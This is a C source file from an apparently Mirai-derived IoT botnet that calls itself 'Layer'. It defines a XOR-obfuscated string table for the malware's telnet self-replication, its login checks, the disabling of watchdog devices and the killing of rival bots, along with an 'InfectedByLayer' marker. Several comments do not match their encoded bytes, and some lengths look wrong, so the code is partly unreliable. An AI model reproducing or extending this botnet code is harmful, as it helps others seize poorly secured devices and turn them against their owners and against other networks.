#define _GNU_SOURCE

#ifdef DEBUG
    #include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "headers/xor.h"
#include "headers/util.h"

uint32_t table_key = 0xebf9ca2d;
struct table_value table[MAX_XOR_KEYS];

void table_init(void)
{
	// Scanner Connection Port
    add_entry(XOR_SCAN_PORT, "\xB6\xA9", 2); // 17244

    // Encrypted qBot Strings
    add_entry(XOR_NULL, "\xDD\x9B\x80\x99\x99\xDC\xF5", 7); // (null)

    // Keep Alive/IOCTL/Watchdogs
    add_entry(XOR_IOCTL_WATCH1, "\xDA\x91\x90\x83\xDA\x82\x94\x81\x96\x9D\x91\x9A\x92\xF5", 14); // /dev/watchdog
    add_entry(XOR_IOCTL_WATCH2, "\xDA\x91\x90\x83\xDA\x98\x9C\x86\x96\xDA\x82\x94\x81\x96\x9D\x91\x9A\x92\xF5", 19); // /dev/misc/watchdog
    add_entry(XOR_IOCTL_WATCH3, "\xDA\x91\x90\x83\xDA\x82\x94\x81\x96\x9D\x91\x9A\x92\xC5\xF5", 15); // /dev/watchdog0
    add_entry(XOR_IOCTL_WATCH4, "\xDA\x97\x9C\x9B\xDA\x82\x94\x81\x96\x9D\x91\x9A\x92\xF5", 14); // /bin/watchdog
    add_entry(XOR_IOCTL_WATCH5, "\xDA\x90\x81\x96\xDA\x82\x94\x81\x96\x9D\x91\x9A\x92\xF5", 14); // /etc/watchdog

    // Telnet Selfrep 
    add_entry(XOR_SCAN_SHELL, "\x86\x9D\x90\x99\x99\xF5", 6); // shell
    add_entry(XOR_SCAN_ENABLE, "\x90\x9B\x94\x97\x99\x90\xF5", 7); // enable
    add_entry(XOR_SCAN_SYSTEM, "\x86\x8C\x86\x81\x90\x98\xF5", 7); // system
    add_entry(XOR_SCAN_LINUXSHELL, "\x99\x9C\x9B\x80\x8D\x86\x9D\x90\x99\x99\xF5", 11); // linuxshell
    add_entry(XOR_SCAN_BAH, "\x17\x14\x1D\x75", 4); // bah
    add_entry(XOR_SCAN_SH, "\x86\x9D\xF5", 3); // sh
    
    // Checks Login
    add_entry(XOR_SCAN_NCORRECT, "\x9B\x96\x9A\x87\x87\x90\x96\x81\xF5", 9); // ncorrect
    add_entry(XOR_SCAN_OGIN, "\x9A\x92\x9C\x9B\xF5", 5); // ogin
    add_entry(XOR_SCAN_ENTER, "\x90\x9B\x81\x90\x87\xF5", 6); // enter
    add_entry(XOR_SCAN_ASSWORD, "\x94\x86\x86\x82\x9A\x87\x91\xF5", 8); // assword

    // Checks To See If Its Logged In
    add_entry(XOR_SCAN_QUERY, "\xDA\x97\x9C\x9B\xDA\x97\x80\x86\x8C\x97\x9A\x8D\xD5\xBE\xAC\xA1\xBA\xBB\xF5", 19); // /bin/busybox Layer
    add_entry(XOR_SCAN_RESP, "\xBE\xAC\xA1\xBA\xBB\xCF\xD5\x94\x85\x85\x99\x90\x81\xD5\x9B\x9A\x81\xD5\x93\x9A\x80\x9B\x91\xF5", 24); // Layer: applet not found

    // Botkiller
    add_entry(XOR_KILL_PROC, "\xDA\x85\x87\x9A\x96\xDA\xF5", 7); // /proc/
    add_entry(XOR_KILL_EXE, "\xDA\x90\x8D\x90\xF5", 5); // /exe
    add_entry(XOR_KILL_FD, "\xDA\x93\x91\xF5", 4); // /fd
    add_entry(XOR_KILL_MAPS, "\xDA\x98\x94\x85\x86\xF5", 6); // /maps
    add_entry(XOR_KILL_TCP, "\xDA\x85\x87\x9A\x96\xDA\x9B\x90\x81\xDA\x81\x96\x85\xF5", 14); // /proc/net/tcp

    // Strings to Kill
    add_entry(XOR_MEM_HTTP, "\xA0\x86\x90\x87\xD8\xB4\x92\x90\x9B\x81\xCF\xF5", 8); // User-Agent: // kills nets with HTTP method
    add_entry(XOR_MEM_QBOT1, "\xDA\x91\x90\x83\xDA\x9B\x80\x99\x99\xF5", 10); // /dev/null // kills most qbots
    add_entry(XOR_MEM_QBOT2, "\xA6\xA1\xB1\xF5", 4); // STD
    add_entry(XOR_MEM_QBOT3, "\xDA\x85\x87\x9A\x96\xDA\x9B\x90\x81\xDA\x87\x9A\x80\x81\x90\xF5", 16); // /etc/rc.conf
    add_entry(XOR_MEM_MIRAI, "\xDA\x85\x87\x9A\x96\xDA\x9B\x90\x81\xDA\x81\x96\x85\xF5", 14); // /proc/net/tcp
    add_entry(XOR_MEM_SELF_EXE, "\xDA\x85\x87\x9A\x96\xDA\x86\x90\x99\x93\xDA\x90\x8D\x90\xF5", 15); // /proc/self/exe
    add_entry(XOR_MEM_UPX, "\xA0\xA5\xAD\xD4\xF5", 5); // UPX!
    add_entry(XOR_MEM_ROUTE, "\xDA\x85\x87\x9A\x96\xDA\x9B\x90\x81\xDA\x87\x9A\x80\x81\x90\xF5", 16); // /proc/net/route
    add_entry(XOR_MEM_RC, "\xDA\x90\x81\x96\xDA\x87\x96\xDB\x91\xDA\x87\x96\xDB\x99\x9A\x96\x94\x99\xF5", 19); // /etc/rc.d/rc.local
    add_entry(XOR_MEM_BINSH, "\xDA\x97\x9C\x9B\xDA\x86\x9D\xF5", 8); // /bin/sh

    // Misc 
    add_entry(XOR_EXEC_SUCCESS, "\xBC\x9B\x93\x90\x96\x81\x90\x91\xB7\x8C\xB9\x94\x8C\x90\x87\xF5", 8); // InfectedByLayer
    add_entry(XOR_RANDOM, "\x84\xB6\xCD\x96\xA3\x80\xB2\xA1\x9B\xA7\xBD\xC3\x96\x93\x83\xC2\x86\x9F\x96\xAC\xA5\xB3\x83\xC2\x92\x80\xB4\x98\xAF\x8D\x97\xA4\xA7\x96\xC0\xC2\x93\xA3\xC2\xC2\xBC\xA0\xA0\x9F\xC0\x97\xC3\x82\x9A\x96\x85\x93\xB3\xBF\xA5\x98\xBD\xB6\xF5", 59); // qC8cVuGTnRH6cfv7sjcYPFv7guAmZxbQRc57fV77IUUj5b6wocpfFJPmHC
    
}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];
    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];
    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];
    if(len != NULL)
        *len = (int)val->val_len;

    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);
    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
}

static void toggle_obf(uint8_t id)
{
    int i = 0;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for(i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }
}
